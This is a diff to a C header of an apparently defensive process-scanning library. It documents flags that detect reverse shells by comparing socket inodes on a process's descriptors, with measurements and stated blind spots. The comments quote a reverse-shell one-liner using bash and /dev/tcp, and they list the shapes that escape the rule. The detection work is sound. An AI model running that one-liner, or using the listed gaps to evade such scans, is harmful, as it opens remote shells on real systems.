@@ -327,35 +327,62 @@ enum {
 	KOFA_PF_STDIO_SOCKET = 1u << 6,
 
 	/*
-	 * stdin AND stdout ARE THE SAME SOCKET - not two sockets, the same
-	 * one, compared by the inode the kernel names it with.
+	 * fd 0 AND fd 1 ARE THE SAME SOCKET - not two sockets, the same one,
+	 * compared by the inode the kernel names it with.
 	 *
-	 * THIS IS THE REVERSE SHELL, and the difference between this and the
-	 * flag above is the difference between a heuristic and a finding.
+	 * THE COMMON CASE OF A REVERSE SHELL, AND ONLY THE COMMON CASE. Read
+	 * the two sections below before using it; both are measured and both
+	 * change what this flag may be built into.
 	 *
 	 * `bash -i >& /dev/tcp/host/port 0>&1` has one socket and dups it onto
 	 * both ends, because there IS only one connection. A program that was
 	 * merely spawned with socket stdio has a socketpair, and a socketpair
-	 * is two objects with two inodes - one for each direction.
+	 * is two objects with two inodes - one per direction:
 	 *
-	 * Measured on this desktop, which is the whole argument:
+	 *     eight spawned children   stdin 14376315, stdout 14376317
+	 *                              stdin 14382089, stdout 14382091  ...
+	 *                              - always a distinct pair
+	 *     a controlled reverse     stdin 14899490, stdout 14899490
+	 *     shell
 	 *
-	 *     the eight with socket stdio   stdin 14376315, stdout 14376317
-	 *                                   stdin 14382089, stdout 14382091
-	 *                                   stdin 14362326, stdout 14362328  ...
-	 *                                   - always a distinct pair
-	 *     a controlled reverse shell    stdin 14899490, stdout 14899490
+	 * Sweeping every readable process with no shell running returns ZERO,
+	 * and with one running returns exactly it.
 	 *
-	 * Sweeping every process on the machine for stdin == stdout == socket
-	 * returned exactly ONE process, and it was the reverse shell. Eight
-	 * false positives became none, for one string comparison.
 	 *
-	 * STILL NOT A VERDICT, and the honest caveats are short. An inetd-style
-	 * service handed one connected socket as stdio has the same shape and
+	 * IT IS ANCHORED TO fd 0 AND fd 1, AND GENERALISING IT BREAKS IT.
+	 *
+	 * The tempting widening is "any two descriptors share a socket", and
+	 * it is wrong on ordinary software. Measured on this desktop, with
+	 * nothing malicious running:
+	 *
+	 *     claude  fd 1 and fd 7 are one socket; fd 2 and fd 8 are another
+	 *     claude  same shape, twice more
+	 *     code    fd 10 and fd 30 are one socket
+	 *
+	 * Those are a program keeping a spare handle on its own stdout and
+	 * stderr, which is a normal thing to do and has nothing to say about
+	 * anybody. Four false positives arrive the moment the test stops being
+	 * about the two descriptors that MEAN something. Not fd 0 against fd 2
+	 * either: stdout and stderr sharing an object is how every `2>&1` in
+	 * every script on the machine looks.
+	 *
+	 *
+	 * WHAT IT DOES NOT COVER, so nobody reads a quiet sweep as an all-clear.
+	 *
+	 * A shell whose stdio was wired with dup2 onto separate descriptors; a
+	 * socat or ncat relay, where the shell's peer is a local pipe and the
+	 * socket belongs to the relay; anything upgraded to a pty afterwards -
+	 * see KOFA_PF_STDIO_SAME_TTY; a payload that re-execs and rearranges
+	 * its descriptors; a connection passed in over SCM_RIGHTS. This is one
+	 * shape, it is the shape most of them have, and a scan that finds
+	 * nothing has found that this shape is absent and nothing more.
+	 *
+	 *
+	 * AND IT IS NOT A VERDICT EVEN WHEN IT FIRES. An inetd-style service
+	 * handed one connected socket as its stdio has exactly this shape and
 	 * is doing its job; so does a container entry point wired that way. It
-	 * is a statement about the DESCRIPTORS, and what makes it a finding is
-	 * the other half - see KOFA_PF_SHELL - which this library reports
-	 * separately and does not join.
+	 * is a statement about two descriptors. The other half is
+	 * KOFA_PF_SHELL, and this library reports both and joins neither.
 	 */
 	KOFA_PF_STDIO_SAME_SOCKET = 1u << 7,
 
@@ -396,7 +423,39 @@ enum {
 	 * It exists to be the second half of KOFA_PF_STDIO_SAME_SOCKET, and
 	 * the join is still the caller's.
 	 */
-	KOFA_PF_SHELL = 1u << 9
+	KOFA_PF_SHELL = 1u << 9,
+
+	/*
+	 * THE PROCESS HOLDS NOTHING BUT THAT ONE SOCKET: every descriptor in
+	 * its table points at the same object as fd 0.
+	 *
+	 * This is the "it has only its stdio" test, and it is written as a
+	 * PROPERTY rather than as a count because the count is wrong. The
+	 * obvious form is "exactly three descriptors", and measured against a
+	 * real shell it never fires:
+	 *
+	 *     bash -i >& /dev/tcp/...   fd 0, 1, 2 AND 255 -> socket:[14908548]
+	 *
+	 * fd 255 is bash's own copy of the terminal, kept for job control in
+	 * every interactive shell. dash and sh have three descriptors, bash
+	 * has four, and another shell may have five - so a number here encodes
+	 * which shell the rule was written against. "Every descriptor is the
+	 * same object" says what was actually meant and is true of all of them.
+	 *
+	 * WHAT IT SEPARATES. A program that is doing work holds a working set:
+	 * files, an epoll, pipes, a terminal, the listening socket it accepted
+	 * from. A shell handed a connection and nothing else holds exactly the
+	 * connection. That is also why this does NOT fire on netcat, ncat or
+	 * socat: a relay holds its listening socket and its accepted socket at
+	 * the very least, so its descriptors are not one object. Those tools
+	 * are a different shape and want a different rule - this one is for
+	 * the case where a SHELL was given the socket directly, which is the
+	 * common one.
+	 *
+	 * Combined with KOFA_PF_SHELL this is the whole finding, and the
+	 * combining is still the caller's.
+	 */
+	KOFA_PF_STDIO_ONLY = 1u << 10
 };
 
 struct kofa_proc {
